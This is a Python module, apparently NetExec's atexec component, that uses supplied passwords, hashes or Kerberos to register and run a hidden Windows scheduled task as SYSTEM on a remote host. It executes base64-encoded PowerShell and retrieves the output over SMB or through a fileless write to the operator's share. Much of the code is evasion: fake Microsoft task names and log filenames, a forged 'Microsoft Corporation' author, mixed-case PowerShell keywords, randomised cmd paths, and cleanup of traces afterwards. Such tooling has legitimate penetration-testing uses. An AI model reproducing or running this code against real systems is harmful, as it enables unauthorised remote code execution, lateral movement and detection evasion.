import os
import base64
from impacket.dcerpc.v5 import tsch, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from nxc.helpers.misc import gen_random_string
from nxc.paths import TMP_PATH
from time import sleep
from datetime import datetime, timedelta
import contextlib
import random
import uuid


class TSCH_EXEC:
    def __init__(self, target, share_name, username, password, domain, doKerberos=False, aesKey=None, remoteHost=None, kdcHost=None, hashes=None, logger=None, tries=None, share=None):
        self.__target = target
        self.__username = username
        self.__password = password or ""
        self.__domain = domain
        self.__share_name = share_name
        self.__lmhash = ""
        self.__nthash = ""
        self.__outputBuffer = b""
        self.__retOutput = False
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__remoteHost = remoteHost
        self.__kdcHost = kdcHost
        self.__tries = tries
        self.__output_filename = None
        self.__share = share
        self.logger = logger

        if hashes is not None:
            if ":" in hashes:
                self.__lmhash, self.__nthash = hashes.split(":")
            else:
                self.__nthash = hashes

        stringbinding = rf"ncacn_np:{self.__target}[\pipe\atsvc]"
        self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)
        self.__rpctransport.setRemoteHost(self.__remoteHost)

        if hasattr(self.__rpctransport, "set_credentials"):
            self.__rpctransport.set_credentials(
                self.__username,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash,
                self.__aesKey,
            )
            self.__rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

    # ----------------------------------------------------------------------
    def execute(self, command, output=False):
        self.__retOutput = output
        self.execute_handler(command)
        return self.__outputBuffer

    def output_callback(self, data):
        self.__outputBuffer = data

    # ----------------------------------------------------------------------
    def get_legitimate_task_filename(self):
        """Generate a more plausible task scheduler related filename"""
        task_prefixes = ["TS", "Task", "Microsoft-Task", "Windows-Task",
                         "TaskManager", "Schedule"]
        extensions = ["wdb"]

        prefix = random.choice(task_prefixes)
        extension = random.choice(extensions)

        formats = [
            f"{prefix}_{uuid.uuid4().hex[:8].upper()}.{extension}",
            f"{prefix}-{datetime.now().strftime('%Y%m%d')}.{extension}",
            f"Microsoft-{prefix}-{gen_random_string(6).upper()}.{extension}",
        ]
        return random.choice(formats)

    def get_end_boundary(self):
        """Generate an end boundary timestamp (+1 day)."""
        return datetime.now() + timedelta(days=1)

    # ----------------------------------------------------------------------
    def get_legitimate_task_name(self):
        """Generate a more plausible scheduled task name"""
        vendors = ["Microsoft", "Windows", "System"]
        components = ["Maintenance", "Update", "Diagnostics", "Performance",
                      "Security", "Network"]
        actions = ["Task", "Manager", "Monitor", "Service", "Scheduler"]

        formats = [
            f"{random.choice(vendors)}-{random.choice(components)}-{random.choice(actions)}",
            f"{random.choice(vendors)}{random.choice(components)}",
            f"{random.choice(components)}{random.choice(actions)}",
        ]
        task_name = random.choice(formats)
        if random.choice([True, False]):
            task_name = f"{task_name}-{uuid.uuid4().hex[:8].upper()}"
        return task_name

    # ----------------------------------------------------------------------
    def gen_xml(self, command, fileless=False):
        safer_command = command

        if "powershell" in command.lower() and ("-command" in command.lower() or "-c " in command.lower()):
            self.logger.debug("PowerShell command detected, keeping as is (user requested)")
            safer_command = command.replace("powershell", "poWerSheLL").replace("POWERSHELL", "PoWeRsHeLL")

        valid_system_filename_prefixes = [
            "DiagTrack-", "CompatTel-", "WindowsUpdate-", "NetTrace-",
            "Defender-", "SIH-", "WER-", "Cluster-", "ws_trace-",
        ]
        system_prefix = random.choice(valid_system_filename_prefixes)
        random_date = datetime.now().strftime("%Y%m%d")
        random_suffix = gen_random_string(4)
        legit_filename = f"{system_prefix}{random_date}-{random_suffix}.log"

        task_filename = self.get_legitimate_task_filename()
        current_time = datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
        self.logger.debug(f"Creation time: {current_time}")

        self.__output_filename = f"C:\\ProgramData\\{task_filename}"

        if self.__retOutput:
            if fileless:
                local_ip = self.__rpctransport.get_socket().getsockname()[0]
                ps_cmd = f"[IO.File]::WriteAllText('\\\\{local_ip}\\{self.__share_name}\\{legit_filename}', (& {{ {safer_command} }}))"
            else:
                ps_cmd = f"[IO.File]::WriteAllText('{self.__output_filename}', (& {{ {safer_command} }}))"
        else:
            # Optional obfuscation: randomize cmd path and args
            random_cmd_path = [
                "cmd", "cmd.exe",
                "C:\\Windows\\System32\\cmd",
                "C:\\Windows\\System32\\cmd.exe",
                "C:\\Windows\\System32\\..\\System32\\cmd.exe",
            ]
            random_cmd_arg = ["/c", "/C", "/Q /c", "/F:ON /c"]
            ps_cmd = f"{random.choice(random_cmd_path)} {random.choice(random_cmd_arg)} {safer_command}"

        b64 = base64.b64encode(ps_cmd.encode("utf-16le")).decode()

        return f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>{current_time}</Date>
    <Author>Microsoft Corporation</Author>
    <Description>Scheduled system maintenance and diagnostics task</Description>
  </RegistrationInfo>
  <Triggers>
    <RegistrationTrigger>
      <Enabled>true</Enabled>
    </RegistrationTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Command>
      <Arguments>-EncodedCommand {b64}</Arguments>
    </Exec>
  </Actions>
</Task>"""

    # ----------------------------------------------------------------------
    def windows_path_to_smb(self, windows_path):
        """Convert a Windows path to SMB path format correctly handling nested directories."""
        return windows_path.replace("C:", "").replace("\\", "/").lstrip("/")

    # ----------------------------------------------------------------------
    def execute_handler(self, command, fileless=False):
        dce = self.__rpctransport.get_dce_rpc()
        if self.__doKerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)

        dce.set_credentials(*self.__rpctransport.get_credentials())

        try:
            dce.connect()
        except Exception as e:
            self.logger.fail(f"Failed to connect to DCE/RPC service: {e!s}")
            return

        tmpName = self.get_legitimate_task_name()
        self.logger.debug(f"Using task name: {tmpName}")

        xml = self.gen_xml(command, fileless)
        self.logger.debug(f"Task XML: {xml}")
        self.logger.info(f"Creating task: {tmpName}")

        try:
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.bind(tsch.MSRPC_UUID_TSCHS)
            tsch.hSchRpcRegisterTask(dce, f"\\{tmpName}", xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
            self.logger.debug("Task registered successfully")
        except Exception as e:
            if hasattr(e, "error_code") and e.error_code and hex(e.error_code) == "0x80070005":
                self.logger.fail("ATEXEC: Create schedule task got blocked.")
            else:
                self.logger.fail(str(e))
            with contextlib.suppress(Exception):
                dce.disconnect()
            return

        try:
            self.logger.debug("Attempting manual task execution...")
            tsch.hSchRpcRun(dce, f"\\{tmpName}", NULL)
            self.logger.debug("Task run request sent successfully")
        except Exception as e:
            self.logger.debug(f"Manual execution failed: {e!s}, relying on registration trigger")

        sleep(3)
        wait_attempts = 0
        done = False
        task_ran = False
        max_attempts = 15

        while not done and wait_attempts < max_attempts:
            if self.__retOutput and wait_attempts >= 2:
                try:
                    self.logger.debug(f"Checking for output file (attempt {wait_attempts + 1})")
                    smb_path = self.windows_path_to_smb(self.__output_filename)
                    smbConnection = self.__rpctransport.get_smb_connection()
                    smbConnection.getFile(self.__share, smb_path, self.output_callback)
                    self.logger.debug("Found output file, task completed successfully")
                    done = True
                    task_ran = True
                    break
                except Exception as e:
                    self.logger.debug(f"Output file check: {e}")

            try:
                self.logger.debug(f"Checking task execution status (attempt {wait_attempts + 1}/{max_attempts})")
                resp = tsch.hSchRpcGetLastRunInfo(dce, f"\\{tmpName}")
                if resp["pLastRuntime"]["wYear"] != 0:
                    self.logger.debug(f"Task \\{tmpName} has run successfully")
                    done = True
                    task_ran = True
                else:
                    self.logger.debug("Task has not completed yet, waiting...")
                    wait_attempts += 1
                    sleep(2)
            except Exception as e:
                self.logger.debug(f"Status check: {e}")
                wait_attempts += 1
                sleep(2)

        try:
            self.logger.info(f"Deleting task: {tmpName}")
            tsch.hSchRpcDelete(dce, f"\\{tmpName}")
        except Exception as e:
            self.logger.debug(f"Error deleting task: {e!s}")

        if not task_ran and self.__retOutput:
            self.logger.debug("Task status unclear, waiting additional time for potential output")
            sleep(3)

        if self.__retOutput:
            if fileless:
                max_attempts = 10
                attempts = 0
                while attempts < max_attempts:
                    try:
                        file_path = os.path.join(TMP_PATH, "nxc_hosted", os.path.basename(self.__output_filename))
                        self.logger.debug(f"Looking for fileless output at: {file_path}")
                        with open(file_path) as output:
                            self.output_callback(output.read())
                        try:
                            os.remove(file_path)
                            self.logger.debug(f"Removed fileless output file: {file_path}")
                        except OSError as e:
                            self.logger.debug(f"Could not remove file {file_path}: {e}")
                        break
                    except OSError:
                        sleep(1)
                        attempts += 1
            else:
                smbConnection = self.__rpctransport.get_smb_connection()
                tries = 1
                smb_path = self.windows_path_to_smb(self.__output_filename)
                output_basename = os.path.basename(self.__output_filename)

                while tries <= self.__tries:
                    try:
                        self.logger.info(f"Attempting to read output from: {self.__output_filename}")
                        smbConnection.getFile(self.__share, smb_path, self.output_callback)
                        break
                    except Exception as e:
                        if "STATUS_BAD_NETWORK_NAME" in str(e):
                            self.logger.fail(f"ATEXEC: Getting the output file failed - target blocked share: {self.__share}")
                            break
                        elif "STATUS_VIRUS_INFECTED" in str(e):
                            self.logger.fail("Command did not run because a virus was detected")
                            break
                        elif "STATUS_OBJECT_PATH_NOT_FOUND" in str(e):
                            self.logger.info(f"Path not found for {self.__output_filename}, trying alternate path...")
                            try:
                                alternate_path = output_basename
                                self.logger.debug(f"Attempting with alternate path: {alternate_path}")
                                smbConnection.getFile(self.__share, alternate_path, self.output_callback)
                                self.logger.debug("Successfully retrieved file with alternate path")
                                break
                            except Exception as alt_e:
                                self.logger.debug(f"Alternate path also failed: {alt_e}")
                        elif "STATUS_SHARING_VIOLATION" in str(e):
                            self.logger.info(f"File {output_basename} is still in use, retrying...")
                        elif "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
                            self.logger.info(f"File {output_basename} not found, retrying...")
                        else:
                            self.logger.debug(f"Error reading output file: {e!s}. Retrying...")

                        tries += 1
                        sleep(1)
                        if tries > self.__tries:
                            self.logger.fail("ATEXEC: Could not retrieve output file after maximum attempts.")

                if tries <= self.__tries:
                    try:
                        self.logger.debug(f"Deleting output file: {output_basename}")
                        smbConnection.deleteFile(self.__share, smb_path)
                    except Exception as e:
                        self.logger.debug(f"Could not delete output file: {e!s}")
                        with contextlib.suppress(Exception):
                            smbConnection.deleteFile(self.__share, output_basename)

        with contextlib.suppress(Exception):
            dce.disconnect()
